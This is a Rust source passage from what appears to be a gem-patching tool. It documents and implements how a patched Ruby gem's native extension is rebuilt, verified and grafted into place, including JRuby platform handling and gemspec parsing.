//! Agent-mode patches to a gem's native extension (#1996).
//!
//! Ruby loads compiled code, never the sources beside it: the shared object
//! RubyGems compiled when it installed the gem
//! (`extensions/<platform>/<abi>/<gem>-<version>/…` and, with
//! `Gem.install_extension_in_lib`, its copy under the gem's `lib/`), or,
//! for a precompiled platform gem (`nokogiri-1.18.3-arm64-darwin`), the
//! binary the gem ships for the running Ruby
//! (`lib/nokogiri/3.4/nokogiri.bundle`). A patch that rewrites only the
//! sources in place leaves the vulnerable compiled code running. So when a
//! gem patch changes a native-extension build input, `apply` rebuilds the
//! extension with RubyGems' own builder, the step `gem install` runs
//! (`extconf.rb` + `make`, a Rakefile, a CMake or Cargo build), with the
//! Ruby that owns the install, and puts the build where Ruby loads it.
//!
//! # What is a build input
//!
//! A gem is native when its installed gemspec declares extensions, or its
//! platform is not `ruby` (a precompiled gem). In a native gem a patched
//! file is a build input unless it clearly is not one (`classify`):
//! `extconf.rb` builds from whatever the gem packs. nokogiri's builds its
//! vendored libxml2 from `patches/libxml2/*.patch`, `ports/**` and
//! `dependencies.yml`, so a record whose only file is an added
//! `patches/libxml2/<n>.patch` changes the compiled library. Ruby source
//! outside `ext/` and a build script's dir is not one, wherever the gem
//! keeps it: Ruby loads it as it is. A gem that is not native has no build
//! inputs but a C source under `ext/`.
//!
//! # What it is built from
//!
//! The source gem, `<name>-<version>.gem`, when it can be had
//! ([`crate::patch::gem_source`]): from the gem home's `cache/`, where
//! RubyGems and Bundler keep it, else downloaded from the default registry
//! and verified against the sha256 its compact index records. Nothing in
//! the project's lock chooses the URL or the hash; a gem the lock resolves
//! from another source is not downloaded at all. An
//! installed copy does not hold everything its extension was built from: a
//! build deletes what it is done with (nokogiri's `ports/`), and a
//! precompiled gem never shipped the build's inputs. The rebuild:
//!
//! 1. Preflight, from files alone: the copy must be a RubyGems install (a
//!    `specifications/` entry beside `gems/`) of a native gem, with a Ruby
//!    to try; a gem RubyGems built must have its extension dir on disk; a
//!    precompiled one must have a way to its source gem (the cached
//!    archive, or a run that may download it). Otherwise the purl is
//!    refused with [`UNSUPPORTED_CODE`] and nothing is written. (The JRuby
//!    build of a gem never gets here: see "The JVM build of a gem".)
//! 2. The record's files are verified against the copy, and the Ruby that
//!    owns the install is found (or the purl is refused as in 1).
//! 3. The source gem is unpacked into a stage inside the gem home
//!    (`<home>/.socket-patch-build/<gem>`) and proven to be the installed
//!    copy's own source: every file the two trees share is byte-identical
//!    (`prove_own_source`). An archive is found by name and version, and a
//!    name does not say whose gem it is; the files do.
//! 4. The record is laid over it with [`apply_package_patch`]: every
//!    `beforeHash` must hold in the pristine gem, or the archive is not
//!    the gem the patch was written for.
//! 5. RubyGems builds the staged gem's extension in the stage: a gem it
//!    built, with the build arguments it recorded for the installed copy;
//!    a precompiled gem, as its publisher built it, with none
//!    ([`RubyRun::StageBuild`]). A gem the build
//!    needs and the install lacks (a precompiled nokogiri has no
//!    `mini_portile2`) is installed into the stage home, never into the
//!    user's. A build that leaves what Ruby loads in the gem's own tree
//!    (an FFI gem's `ext/<name>/lib<name>.so`) cannot be moved in from a
//!    stage (`in_tree_products`).
//! 6. The record's files are written into the installed copy, and the
//!    build takes the place of the compiled code Ruby loads. For a gem
//!    RubyGems built, the staged extension dir replaces the installed one
//!    (parked while it moves in) and its artifacts replace the `lib/`
//!    copies. For a precompiled gem, each prebuilt binary the owning Ruby
//!    loads is replaced by the build's (`plan_graft`): no counterpart, or
//!    more than one, is refused with nothing written. The first time, the
//!    original build (the prebuilt binaries) is copied to a backup inside
//!    the gem dir ([`BACKUP_DIR`]).
//! 7. A marker ([`MARKER_FILE`]) records the source hashes the build was
//!    made from and the hash of every artifact put in place.
//!
//! Nothing of the installed copy is touched before step 6. Whatever stops
//! the run before it (no archive, a stage that cannot be opened, steps 3
//! to 5) leaves a gem RubyGems built the rebuild it always had: in place,
//! from its own tree (`rebuild`). The patched sources are written, the
//! current build is moved aside, and RubyGems builds into a fresh
//! extension dir. That build writes into the gem's own tree too, so the
//! tree is snapshotted first (`TreeSnapshot`): what the build replaced or
//! added there is backed up and attested with the extension dir's
//! artifacts, and a build that compiled nothing is a failed one
//! (`stale_build`). A failed build puts the old build, the gem's tree and
//! the original sources back, and its error names both failures. (The one exception:
//! another run building the same gem right now.) A precompiled gem has no
//! such fallback and is refused, with what it needs: network access to the
//! registry once, or the source gem in the home's `cache/`.
//!
//! A build that exits cleanly has not always built the patch. A gem's
//! build takes what it compiles from its configuration: one set up to link
//! the system's copy of a library the gem packs (nokogiri installed with
//! `--use-system-libraries`) never opens the packed copy's sources, so a
//! record that changes only those would be written, "rebuilt" and attested
//! with nothing of it in what Ruby loads. So the record's build inputs are
//! marked unread before the build, and a build that read none of them is
//! not taken for a build of the patch (`unread_inputs`). Neither is one
//! that leaves no compiled file at all: a gem whose extension script
//! downloads the binary it runs (passenger's agent) has nothing a build
//! could put where Ruby loads it. Either way the record's files are
//! written, the compiled code stays what it was, no marker is written, and
//! the patch is incomplete ([`GemCaveat::Incomplete`],
//! `Job::write_without_build`): the patch's Ruby files are in effect, a
//! source the gem compiles later on its own is the patched one, and
//! nothing attests the copy. The result is not a failed one, so nothing is
//! put back; the caller fails the run on the caveat and warns with
//! [`NOT_REBUILT_REASON`].
//!
//! A build can take many minutes. The run says when one starts and when
//! it ends ([`RubyEnv::progress`]).
//!
//! `vex` and `apply --check` attest a copy only when its marker matches the
//! record's patched sources and every recorded artifact still hashes as
//! built ([`verify_native_build`]), whichever way it was built. A
//! precompiled gem ships one binary per Ruby minor, and a graft replaces
//! the one of the Ruby that ran `apply`, as `gem install` builds for the
//! Ruby that runs it: the copy is attested from then on, and the binaries
//! the gem ships for other Rubies are not held against it. `apply` under
//! another Ruby of the same gem home grafts that Ruby's binary into the
//! same marker and backup (`built_state`). `rollback` puts the backed-up
//! original build back ([`restore_original_build`]), prebuilt binaries
//! byte for byte.
//!
//! # The JVM build of a gem
//!
//! JRuby installs a gem's `java` platform build (`nokogiri-1.18.10-java`),
//! whose compiled code is jars. It builds no C extension, so nothing above
//! applies to it: no Ruby is started, nothing is built and no marker is
//! written. (A `java` gem whose gemspec declares extensions is not such a
//! build: RubyGems compiles something for it at install time, and it is
//! rebuilt like any gem RubyGems built.) The records are written for the
//! `ruby` platform gem, and such a copy takes of one what is part of its
//! own build (`jvm_takes`):
//!
//! * An input of a C build by its path (under `ext/`, `patches/`,
//!   `ports/`, or a source or build file by name) is the one kind of file
//!   that can be left out, since it means nothing to a gem with no C
//!   build. One the record replaces is verified and written when the copy
//!   holds it (a C source the JVM build ships anyway: dead code there),
//!   and skipped when it does not. One the record adds is skipped.
//! * Every other file is taken like any patch file: a Ruby file the
//!   record replaces must be there (one that is missing is the usual
//!   failure, never a patch with nothing to do), and a file it adds is
//!   created.
//!
//! With its applicable files written the record is applied: `apply
//! --check` and `vex` judge the copy by those files alone
//! ([`installed_files`]), and `rollback` undoes those. A record none of
//! whose files is part of the build changes code that is not in it: the
//! run writes nothing, says so ([`NOT_IN_BUILD_CODE`]) and succeeds, and
//! the copy counts as patched. It is the rule Socket's backend follows
//! when it builds a patched `java` platform gem, so a copy patched in
//! place holds the same files as one installed from that gem.
//!
//! That rule is for the ruby-platform record alone (no `platform`
//! qualifier, or `ruby`). A record qualified for a platform names the
//! archive it was written for: every file of it is required, and one the
//! copy lacks is the usual missing file. When the manifest holds a record
//! for the copy's own platform that matches it, that record alone is the
//! copy's, for every reader ([`own_platform_record`]).
//!
//! The one thing that cannot be done here is rebuild a jar. A
//! ruby-platform record that changes a JVM build input
//! (`is_jvm_build_input`: a Java, Kotlin or Scala source, a Maven, Ant or
//! Gradle build file) and brings no compiled code has its files written
//! and nothing built, the patch is incomplete
//! ([`GemCaveat::Incomplete`], with the [`NOT_REBUILT_REASON`] warning),
//! and nothing ever attests the copy ([`verify_native_build`]). A record
//! that replaces or adds a jar or a class file carries the code the JVM
//! loads, and the record written for the copy's own platform is the
//! `java` gem's own diff: neither is held up by a source it also changes
//! (`jvm_unbuilt_inputs`).
//!
//! # What is executed, and when
//!
//! A gem tree can be supplied by the repository being scanned (a committed
//! `vendor/bundle`), and its installed gemspec is a Ruby program. So
//! whether a record needs a rebuild is decided without running anything:
//! the gemspec is read as text (it is `Gem::Specification#to_ruby` output)
//! for its `extensions`, its platform and its require paths (`SpecFacts`),
//! never evaluated. `--dry-run`, `apply --check` and `vex` stop there. They
//! start no Ruby and download nothing.
//!
//! A real run starts a program only after the record's files verified
//! against the installed copy (each holds its `beforeHash` or `afterHash`
//! content, or a mismatch the caller's policy overwrites; a build input
//! the copy does not hold is checked in step 4 instead), and then, in this
//! order:
//!
//! 1. The host Ruby alone, asked where it builds extensions for the copy's
//!    gem home and what it is (`RubyRun::ExtensionsDir`). That loads
//!    RubyGems and nothing of the gem.
//! 2. RubyGems, unpacking the source gem into the stage
//!    (`RubyRun::Unpack`) and naming the gems its build depends on that are
//!    not installed (`RubyRun::MissingDeps`). The archive's metadata is
//!    read as data; none of its code runs. A missing gem is downloaded
//!    from the registry, verified against its index and installed into the
//!    stage home (`RubyRun::Install`), which runs that gem's build scripts
//!    if it has any.
//! 3. With the unpacked gem proven to be the installed copy's own source
//!    and the record laid over it, RubyGems' extension builder
//!    (`RubyRun::StageBuild`). It runs the archive's own build scripts
//!    (`extconf.rb`, a Rakefile, `make`, the compiler), as `gem install`
//!    ran them, and loads the gemspec `unpack` wrote from the archive. The
//!    installed gemspec is not evaluated at all.
//!
//! The in-place fallback runs RubyGems' builder on the installed copy
//! instead (`RubyRun::Build`), with the patched sources written: it loads
//! the installed gemspec and runs the copy's own build scripts, and
//! refuses to build when the loaded gemspec does not describe the layout
//! its text was read for.
//!
//! The Ruby is the one installed beside the gem home, else the `ruby` on
//! `PATH`; one inside the project is never run (`ruby_candidates`). For a
//! gem RubyGems built it is the Ruby whose extension dir for the gem is the
//! installed one (`find_ruby`); for a precompiled gem, the Ruby that runs
//! the gem's platform and builds its extensions where the home has its
//! other gems' (`find_platform_ruby`). Every run goes without the Socket
//! credentials ([`CHILD_ENV_SCRUB`](crate::utils::process::CHILD_ENV_SCRUB)),
//! `RUBYOPT`, `RUBYLIB` and `BUNDLE*`.
//!
//! The hosted stale-install refresh ([`crate::patch::gem_refresh`]) builds
//! a native gem another way (`install_staged`, `RubyRun::Install`): the
//! same Ruby, found by the same probe, installs a `.gem` archive whose
//! sha256 the lock pins into an empty stage home. RubyGems reads the spec
//! from the archive's own metadata and runs the archive's build scripts,
//! so nothing the project's tree holds is evaluated, and nothing of the
//! installed copy is touched until the finished gem and extension are
//! swapped in together.
//!
//! # A rebuild that does not finish
//!
//! A build takes minutes, and the run can be interrupted or killed in the
//! middle of it. The build leads its own process group; the CLI's interrupt
//! handler ends that group before it releases the apply lock
//! ([`kill_builds_on_interrupt`](crate::utils::process::kill_builds_on_interrupt)),
//! so no compiler is left writing into the gem.
//!
//! A build in the stage leaves the installed copy untouched, so an
//! interrupted one leaves only the stage dir, under an advisory lock that
//! went with its process. The next `apply` or `rollback` of the copy drops
//! it (`sweep_stale_stage`). A stage a run in another process still holds
//! (a gem home shared between projects) is left alone, and the purl is
//! refused. Where a directory cannot be locked, a stage counts as held
//! until its heartbeat is older than any step of a build lasts. The stage
//! is only ever named through `stage_dirs`, which refuses a link planted
//! where it goes: the gem tree may be the scanned repository's, and nothing
//! in it steers a delete.
//!
//! While a finished build moves in, and for the whole of an in-place
//! build, the previous build is parked beside the extension dir
//! (`parked_build_path`), under the same kind of lock, and the previous
//! marker stays in the gem dir until the new build's replaces it. The next
//! `apply` or `rollback` of the copy starts by moving a parked build back
//! (`recover_interrupted_rebuild`), unless the extension dir holds a
//! finished build. The sources stay patched, which is the state `apply`
//! completes with a rebuild and `rollback` undoes. A graft that stops
//! between two binaries leaves the backup of the originals in the gem dir
//! and no marker: `apply` grafts again, and `rollback` restores them.

use std::collections::{BTreeMap, HashMap};
use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::hash::git_sha256::compute_git_sha256_from_bytes;
use crate::manifest::schema::PatchFileInfo;
use crate::patch::apply::{
    apply_file_patch_at, apply_package_patch, is_safe_relative_subpath, normalize_file_path,
    ApplyResult, MismatchPolicy, PatchSources,
};
use crate::patch::file_hash::compute_file_git_sha256_sync;
use crate::patch::gem_source::{GemId, GemSource, RubyVersions};
use crate::utils::containment::{ensure_dir_or_absent, try_entry_type};
use crate::utils::fs::read_regular_to_bytes_sync;

/// The refusal when a native-extension patch cannot be rebuilt here (the
/// vendored backend's code for the same limitation).
pub const UNSUPPORTED_CODE: &str = "native_extensions_unsupported";
/// The extension failed to build from the patched sources; the installed
/// copy is as it was before the run.
pub const BUILD_FAILED_CODE: &str = "native_extension_build_failed";
/// Advisory: sources that were already patched were rebuilt into the
/// extension (a release before #1996 patched them without a rebuild; a
/// precompiled gem's were built for another Ruby of its gem home).
pub const REBUILT_CODE: &str = "native_extension_rebuilt";
/// `rollback` restored the sources but could not put the original compiled
/// extension back.
pub const RESTORE_FAILED_CODE: &str = "native_extension_restore_failed";
/// The `vex` / `apply --check` routing tag of a copy whose sources carry
/// the patch while its compiled extension was not built from them.
pub const NOT_REBUILT_REASON: &str = "native_extension_not_rebuilt";
/// The reason of a copy `apply` skips because no file of the record is part
/// of the build installed there: the JVM build of a gem (what JRuby
/// installs) has none of the C code a record for the `ruby` platform gem
/// may be all about. Nothing is written, and the copy counts as patched.
pub const NOT_IN_BUILD_CODE: &str = "not_in_platform_build";

/// The build marker, in the gem dir (see [`BuildMarker`]).
pub const MARKER_FILE: &str = ".socket-patch-native-build.json";
/// The original build's backup, in the gem dir (see [`restore_original_build`]).
pub const BACKUP_DIR: &str = ".socket-patch-native-orig";
/// The backup's description file, inside [`BACKUP_DIR`].
const BACKUP_INFO: &str = "backup.json";
/// What every entry this module keeps in a gem dir starts with: the
/// marker, the backup and their stages.
const OWN_ENTRY_PREFIX: &str = ".socket-patch-native";

/// The stage a rebuild from the source gem builds in, inside the gem home
/// (the same filesystem as the build it replaces, so the finished extension
/// dir is renamed into place): `<home>/.socket-patch-build/<full_name>`.
const BUILD_STAGE_DIR: &str = ".socket-patch-build";

/// How long one Ruby probe may take.
const PROBE_TIMEOUT: Duration = Duration::from_secs(60);
/// How long unpacking one source gem into the stage may take.
const UNPACK_TIMEOUT: Duration = Duration::from_secs(5 * 60);
/// How many gems one build may need staged beside it before the run gives
/// up on it (a build needs one or two: `mini_portile2`, `rb_sys`).
const MAX_STAGED_DEPENDENCIES: usize = 12;
/// How long one extension build may take (nokogiri's vendored libxml2 build
/// takes minutes).
const BUILD_TIMEOUT: Duration = Duration::from_secs(30 * 60);

/// The file RubyGems leaves in an extension dir once every extension of
/// the gem is built: without it the gem counts as not built, and RubyGems
/// ignores it.
const BUILD_COMPLETE: &str = "gem.build_complete";

/// Files RubyGems writes into an extension dir that are not build products.
const EXT_DIR_METADATA: &[&str] = &[BUILD_COMPLETE, "gem_make.out", "mkmf.log"];

/// Source and build-script extensions a native extension compiles.
const NATIVE_SOURCE_EXTENSIONS: &[&str] = &[
    "c", "h", "cc", "cpp", "cxx", "hh", "hpp", "hxx", "m", "y", "rl",
];

/// Sources a native gem compiles that are not C-family: a JRuby gem's Java,
/// a Rust extension's crate.
const NATIVE_BUILD_EXTENSIONS: &[&str] = &["java", "rs"];

/// Build-system manifests, which are build inputs of a native gem wherever
/// they sit (a `CMakeLists.txt` at the gem root is no document).
const NATIVE_BUILD_FILES: &[&str] = &[
    "CMakeLists.txt",
    "Makefile",
    "GNUmakefile",
    "Cargo.toml",
    "Cargo.lock",
    "build.rs",
];

/// Top-level dirs of a gem that take no part in building its extension:
/// executables, tests, type signatures, examples and documentation.
const NOT_BUILT_DIRS: &[&str] = &[
    "bin",
    "exe",
    "test",
    "tests",
    "t",
    "spec",
    "features",
    "sig",
    "rbi",
    "examples",
    "benchmark",
    "benchmarks",
    "doc",
    "docs",
    "man",
];

/// Ruby source and type signatures, by extension: Ruby (or a type checker)
/// reads them as they are, so outside a build's own dirs they are no build
/// input.
const RUBY_SOURCE_EXTENSIONS: &[&str] = &["rb", "rbs", "rbi", "rake", "ru", "gemspec"];

/// The names rake reads its tasks from, and the script that generates one
/// for an extension (`mkrf_conf.rb`).
const RAKE_SCRIPTS: &[&str] = &["Rakefile", "rakefile", "Rakefile.rb", "mkrf_conf.rb"];

/// Grammar sources a gem ships already generated (racc / ragel output is a
/// `.rb` or `.c` file the gem packs): in a gem that builds no extension they
/// compile nothing at install time.
const GENERATED_GRAMMAR_EXTENSIONS: &[&str] = &["y", "rl"];

/// The probe/build program run by the gem's Ruby ([`RubyRun`] names its
/// modes and their arguments). One line: `-e` with an embedded newline
/// is fragile through a Windows command line. Ruby 1.8 does not load
/// RubyGems by default (and `RUBYOPT` is cleared), so it is required
/// explicitly; a RubyGems older than 2.2 (no per-gem extension dir, no
/// `raw_require_paths`) is refused by name. Every line the program answers
/// with carries an `sp_` key so stray output (an `operating_system.rb`, a
/// shim) is skipped.
///
/// `extensions_dir <home> [<platform>]` evaluates nothing of the gem: it is
/// `Gem::BasicSpecification#extensions_dir` for a spec in `<home>`, a
/// function of this Ruby's platform and ABI (and a packager's
/// `default_ext_dir_for`) alone. A second line names this Ruby: its
/// version, its RubyGems, the suffix of the extensions it loads, its
/// platform, and whether a gem of `<platform>` runs on it.
///
/// `build <gemspec> <extension dir> <require path>` loads the gemspec,
/// which evaluates it, and builds only when it describes the layout its
/// text was read for: the extension dir the probe was matched to, the
/// require path the lib copies were located by, and at least one extension.
/// Otherwise RubyGems would build into a dir that was not set aside.
///
/// `install <archive> <stage home> <installed home>` installs a `.gem` into
/// an empty stage home with RubyGems' own installer, as Bundler would
/// (no dependency resolution, no documentation), building its extensions
/// with the build arguments RubyGems recorded for the installed copy
/// (`<installed home>/build_info/`). It evaluates nothing of the project:
/// the spec is the archive's own metadata and the build scripts are the
/// archive's.
///
/// `unpack <archive> <stage home> <full name>` extracts a `.gem` into
/// `<stage home>/gems/<full name>` and writes its gemspec beside it, as
/// the installer does, without building anything: the archive must be the
/// gem `<full name>` and declare extensions. Nothing of it is evaluated
/// (its metadata is YAML, loaded as data).
///
/// `missing_deps <staged gemspec>` names the runtime dependencies of the
/// staged gem, and of the gems that meet them, that no gem on `GEM_PATH`
/// meets: what its build scripts may `require` and would not find.
///
/// `stage_build <staged gemspec> <stage home> <installed home> [<installed
/// full name>]` builds the staged gem's extensions inside the stage home,
/// with the build arguments RubyGems recorded for the installed copy when
/// it is named (a precompiled copy is not: see [`RubyRun::StageBuild`]). It
/// loads the gemspec `unpack` wrote and runs the archive's build scripts
/// over the staged tree.
const RUBY_SCRIPT: &str = "require 'rubygems'; mode, a, b, c, d = ARGV; \
unless Gem::Specification.respond_to?(:load) && \
Gem::Specification.method_defined?(:extension_dir) && \
Gem::Specification.method_defined?(:raw_require_paths) then \
abort(\"RubyGems #{defined?(Gem::VERSION) ? Gem::VERSION : Gem::RubyGemsVersion} is older than 2.2, \
which has no per-gem extension dir to rebuild into\"); \
end; \
if mode == 'extensions_dir' then \
dir = (Gem.respond_to?(:default_ext_dir_for) && Gem.default_ext_dir_for(a)) || \
File.join(a, 'extensions', Gem::Platform.local.to_s, Gem.extension_api_version); \
puts \"sp_extensions_dir\\t#{File.expand_path(dir)}\"; \
runs = b ? (Gem::Platform.new(b) === Gem::Platform.local ? 'yes' : 'no') : ''; \
puts \"sp_ruby\\t#{RUBY_VERSION}\\t#{Gem::VERSION}\\t#{RbConfig::CONFIG['DLEXT']}\\t\
#{Gem::Platform.local}\\t#{runs}\"; \
elsif mode == 'install' then \
require 'rubygems/installer'; \
abort(\"RubyGems #{Gem::VERSION} is older than 2.5, whose installer cannot stage a gem\") \
unless Gem::Installer.respond_to?(:at); \
Gem::DefaultUserInteraction.ui = Gem::SilentUI.new; \
full = File.basename(a, '.gem'); \
info = File.join(c, 'build_info', \"#{full}.info\"); \
args = File.file?(info) ? File.readlines(info).map { |l| l.chomp } : []; \
inst = Gem::Installer.at(a, :install_dir => b, :ignore_dependencies => true, :wrappers => true, \
:env_shebang => true, :document => [], :post_install_message => false, :build_args => args); \
inst.install; \
puts \"sp_installed\\t#{inst.spec.full_name}\\t#{File.expand_path(inst.spec.extension_dir)}\"; \
elsif mode == 'unpack' then \
require 'rubygems/package'; require 'fileutils'; \
pkg = Gem::Package.new(a); spec = pkg.spec; \
abort(\"the archive holds #{spec.full_name}, not #{c}\") unless spec.full_name == c; \
abort(\"#{spec.full_name} declares no extensions to build\") if spec.extensions.empty?; \
dir = File.join(b, 'gems', spec.full_name); FileUtils.mkdir_p(dir); \
pkg.extract_files(dir); \
specs = File.join(b, 'specifications'); FileUtils.mkdir_p(specs); \
File.open(File.join(specs, \"#{spec.full_name}.gemspec\"), 'wb') { |f| f.write(spec.to_ruby_for_cache) }; \
puts \"sp_unpacked\\t#{spec.full_name}\\t#{spec.raw_require_paths.first}\"; \
elsif mode == 'missing_deps' then \
spec = Gem::Specification.load(a) or abort(\"cannot load #{a}\"); \
seen = {}; todo = [spec]; \
until todo.empty? do \
todo.shift.runtime_dependencies.each do |dep| \
next if seen[dep.name]; \
seen[dep.name] = true; \
found = dep.matching_specs; \
if found.empty? then \
puts \"sp_missing\\t#{dep.name}\\t#{dep.requirement.as_list.join(',')}\"; \
else \
todo << found.sort_by { |s| s.version }.last; \
end; \
end; \
end; \
puts 'sp_deps_checked'; \
elsif mode == 'stage_build' then \
spec = Gem::Specification.load(a) or abort(\"cannot load #{a}\"); \
unless File.expand_path(spec.base_dir) == File.expand_path(b) then \
abort(\"#{a} is not a gem of #{b}\"); \
end; \
abort(\"#{a} declares no extensions\") if spec.extensions.empty?; \
require 'rubygems/ext'; \
Gem::DefaultUserInteraction.ui = Gem::SilentUI.new; \
info = File.join(c, 'build_info', \"#{d}.info\"); \
args = (d && File.file?(info)) ? File.readlines(info).map { |l| l.chomp } : []; \
Gem::Ext::Builder.new(spec, args).build_extensions; \
puts \"sp_built\\t#{File.expand_path(spec.extension_dir)}\"; \
else \
spec = Gem::Specification.load(a) or abort(\"cannot load #{a}\"); \
unless File.expand_path(spec.extension_dir) == File.expand_path(b) then \
abort(\"#{a} builds into #{spec.extension_dir}, not #{b}\"); \
end; \
unless spec.raw_require_paths.first.to_s == c then \
abort(\"#{a} requires from #{spec.raw_require_paths.first.inspect}, not #{c.inspect}\"); \
end; \
abort(\"#{a} declares no extensions\") if spec.extensions.empty?; \
require 'rubygems/ext'; \
Gem::DefaultUserInteraction.ui = Gem::SilentUI.new; \
Gem::Ext::Builder.new(spec, spec.build_args).build_extensions; \
end";

/// One installed RubyGems copy: `<home>/gems/<full_name>` with its
/// `<home>/specifications/<full_name>.gemspec`.
#[derive(Debug, Clone)]
struct GemCopy {
    home: PathBuf,
    full_name: String,
    gem_dir: PathBuf,
    spec_path: PathBuf,
}

impl GemCopy {
    /// The copy at `pkg_path`, when it sits in a RubyGems `gems/` dir.
    /// Whether its spec exists is checked by the caller.
    fn of(pkg_path: &Path) -> Option<GemCopy> {
        // Absolute, because a build runs Ruby from the project dir and
        // `extconf.rb` from the ext dir: a relative crawl root (`--cwd .`,
        // `--cwd proj`) would leave the spec path and `GEM_PATH` pointing
        // nowhere, and an `extconf.rb` that loads `mini_portile2` (nokogiri)
        // from the copy's own home would fail to build. `..` is dropped
        // lexically, as Ruby's `File.expand_path` drops it from the spec
        // path, so both name the same gem dir. A rooted path is kept as is.
        let pkg_path = if pkg_path.has_root() {
            pkg_path.to_path_buf()
        } else {
            crate::utils::relpath::absolute_lexically(pkg_path)
        };
        let pkg_path = pkg_path.as_path();
        let full_name = pkg_path.file_name()?.to_str()?.to_string();
        let gems = pkg_path.parent()?;
        if gems.file_name()? != "gems" {
            return None;
        }
        let home = gems.parent()?.to_path_buf();
        let spec_path = home
            .join("specifications")
            .join(format!("{full_name}.gemspec"));
        Some(GemCopy {
            home,
            full_name,
            gem_dir: pkg_path.to_path_buf(),
            spec_path,
        })
    }
}

/// What the installed gemspec says about extensions.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct ExtensionDecl {
    /// The spec assigns `extensions`.
    declared: bool,
    /// The declared build scripts (`ext/foo/extconf.rb`), when the
    /// assignment lists them as string literals.
    entries: Vec<String>,
}

/// Parse `s.extensions = ["ext/foo/extconf.rb".freeze, …]` out of an
/// installed gemspec (the `Specification#to_ruby` shape RubyGems writes).
/// Whether extensions are declared is the vendored backend's test
/// ([`gemspec_declares_extensions`](crate::vendor::gem::gemspec_declares_extensions)),
/// so both modes agree on which gems are native; the build scripts are the
/// string literals those assignments list. Comments are stripped per line;
/// an assignment whose entries are not string literals is `declared` with
/// no `entries`.
fn parse_extensions(spec_text: &str) -> ExtensionDecl {
    let mut entries = Vec::new();
    for raw in spec_text.lines() {
        let line = raw.split('#').next().unwrap_or("");
        let Some(idx) = line.find(".extensions") else {
            continue;
        };
        let after = &line[idx + ".extensions".len()..];
        if after
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
        {
            continue;
        }
        let after = after.trim_start();
        let rhs = ["+=", "<<", ".push", ".concat"]
            .iter()
            .find_map(|op| after.strip_prefix(op))
            .or_else(|| after.strip_prefix('=').filter(|r| !r.starts_with('=')));
        if let Some(rhs) = rhs {
            entries.extend(string_literals(rhs));
        }
    }
    ExtensionDecl {
        declared: crate::vendor::gem::gemspec_declares_extensions(spec_text),
        entries,
    }
}

/// The right-hand side of every `<receiver>.<attr> = …` line of an
/// installed gemspec (`Specification#to_ruby` writes one assignment per
/// attribute), comments stripped. A comparison (`==`) or a longer attribute
/// name (`require_paths_extra`) is not one.
fn assignments<'t>(spec_text: &'t str, attr: &'t str) -> impl Iterator<Item = &'t str> + 't {
    spec_text.lines().filter_map(move |raw| {
        let line = raw.split('#').next().unwrap_or("");
        let needle = line
            .match_indices(attr)
            .find(|(at, _)| line[..*at].ends_with('.'))?;
        let after = &line[needle.0 + attr.len()..];
        if after
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
        {
            return None;
        }
        after
            .trim_start()
            .strip_prefix('=')
            .filter(|rhs| !rhs.starts_with('='))
    })
}

/// The gem's require paths (`lib`), parsed out of an installed gemspec's
/// `s.require_paths = ["lib".freeze]` (`Specification#to_ruby` always
/// writes the assignment). RubyGems installs the built extension's copies
/// under the first. A spec that assigns none has RubyGems' default, `lib`;
/// an assignment that lists no string literal is `None`.
fn parse_require_paths(spec_text: &str) -> Option<Vec<String>> {
    match assignments(spec_text, "require_paths").next() {
        Some(rhs) => Some(string_literals(rhs)).filter(|paths| !paths.is_empty()),
        None => Some(vec!["lib".to_string()]),
    }
}

/// The string an installed gemspec assigns to `attr` (`s.name =
/// "nokogiri".freeze`): `None` when it assigns none, or something that is
/// not a string literal (`s.platform = Gem::Platform::RUBY`).
fn parse_string_attr(spec_text: &str, attr: &str) -> Option<String> {
    assignments(spec_text, attr)
        .next()
        .and_then(|rhs| string_literals(rhs).into_iter().next())
}

/// The double- and single-quoted string literals in `text`, in order.
fn string_literals(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut chars = text.chars();
    while let Some(c) = chars.next() {
        if c != '"' && c != '\'' {
            continue;
        }
        let mut lit = String::new();
        let mut escaped = false;
        for d in chars.by_ref() {
            if escaped {
                lit.push(d);
                escaped = false;
            } else if d == '\\' {
                escaped = true;
            } else if d == c {
                break;
            } else {
                lit.push(d);
            }
        }
        out.push(lit);
    }
    out
}

/// What an installed gemspec's text says about the gem's compiled code.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct SpecFacts {
    extensions: ExtensionDecl,
    /// The platform of a platform gem (`arm64-darwin`, `x86_64-linux-gnu`,
    /// `java`): the gem's dir name carries it after `<name>-<version>-`,
    /// and its gemspec assigns it. `None` for the `ruby` platform.
    platform: Option<String>,
    /// Every require path the gemspec names (`lib`).
    require_paths: Vec<String>,
    /// The release the copy was installed from, when the gemspec names it
    /// and the dir name agrees: what its source archive is called.
    release: Option<GemId>,
}

impl SpecFacts {
    /// Read the gemspec text of the copy whose gem dir is `full_name`.
    fn of(spec_text: &str, full_name: &str) -> SpecFacts {
        let name = parse_string_attr(spec_text, "name");
        let version = parse_string_attr(spec_text, "version");
        // `<name>-<version>` is the ruby platform; `<name>-<version>-<p>` is
        // the platform gem `p`.
        let suffix = match (&name, &version) {
            (Some(name), Some(version)) => full_name
                .strip_prefix(&format!("{name}-{version}"))
                .filter(|rest| rest.is_empty() || rest.starts_with('-')),
            _ => None,
        };
        let from_dir = suffix.and_then(|rest| rest.strip_prefix('-'));
        let assigned = parse_string_attr(spec_text, "platform").filter(|p| p != "ruby");
        let platform = from_dir
            .map(str::to_string)
            .or(assigned)
            .filter(|p| !p.is_empty());
        let release = match (name, version, suffix) {
            (Some(name), Some(version), Some(_)) => Some(GemId {
                name,
                version,
                platform: from_dir.map(str::to_string),
            }),
            _ => None,
        };
        SpecFacts {
            extensions: parse_extensions(spec_text),
            platform,
            require_paths: parse_require_paths(spec_text).unwrap_or_default(),
            release,
        }
    }

    /// The platform of the JVM build of a gem: a JVM platform
    /// ([`is_java_platform`]) and no extension to build. That is what JRuby
    /// installs for a gem whose compiled code is jars. A `java` gem that
    /// declares extensions (jruby-launcher compiles a native launcher when
    /// it is installed) is built by RubyGems like any gem with extensions,
    /// and its record is rebuilt like one: it is not one of these.
    fn jvm_platform(&self) -> Option<&str> {
        if self.extensions.declared {
            return None;
        }
        self.platform.as_deref().filter(|p| is_java_platform(p))
    }
}

/// Whether `platform` is JRuby's: a `java` gem ships its compiled code as
/// jars built from Java sources, which no source gem's `extconf.rb` builds.
